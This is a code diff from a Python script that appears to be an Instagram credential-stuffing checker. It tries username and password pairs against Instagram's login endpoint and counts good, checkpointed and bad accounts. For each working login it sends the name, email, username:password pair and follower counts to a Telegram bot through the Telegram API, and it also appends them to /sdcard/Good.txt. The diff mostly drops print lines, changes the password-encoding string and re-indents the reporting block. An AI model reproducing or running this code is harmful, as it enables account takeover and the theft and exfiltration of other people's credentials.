@@ -271,10 +271,8 @@ def instagram1():
 						time.sleep(360)
 					elif 'userId' in login:
 						if WTF == "010101":
-							print(45*"≈")
 							username_login = user
 							password_login = pasw
-							print(45*"≈")
 							url_login = 'https://www.instagram.com/accounts/login/ajax/'
 							headers_login = {
                         	    'accept': '*/*',
@@ -297,7 +295,7 @@ def instagram1():
                         	}
 						data_login = {
                         	    'username': username_login,
-                        	    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1613414957:{password_login}',
+                        	    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password_login}',
                         	    'queryParams': '{}',
                         	    'optIntoOneTap': 'false'
                         	}
@@ -306,7 +304,6 @@ def instagram1():
 							print(" - Halla haya la xoto mar krdn\n")
 							exit(0)
 						elif '"authenticated":true' in req_login.text:
-							print('Login Akat Sar Kawtw Bw..\n')
 							sessd = req_login.cookies['sessionid']
 							for file in range(1):
 								url_checker = 'https://www.instagram.com/accounts/login/ajax/'
@@ -357,7 +354,6 @@ def instagram1():
 	                        	            }
 						req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
 						first_name = str(req_get_info.json()['form_data']['username'])
-						print(first_name)
 						def script():
 							try:
 								username = first_name
@@ -379,15 +375,16 @@ def instagram1():
 							posts = description["content"].split(",")[2].split("-")[0]
 							ouput(username,name,following,followers,posts,link_url,profile_pic)
 							def ouput(username,name,following,followers,posts,link_url,profile_pic):
-								os.system("clear")
-								print(logo2)
-								hits+=1
-								print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-								boooom=(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
-								r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
-								with open('/sdcard/Good.txt', 'a') as ff:
-									ff.write(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
-							script()
+							os.system("clear")
+							print(logo2)
+							hits+=1
+							print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+							boooom=(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
+							r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
+							with open('/sdcard/Good.txt', 'a') as ff:
+								ff.write(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
+						script()
+
 					elif ('"message":"checkpoint_required"') in login:
 						os.system("clear")
 						print(logo2)
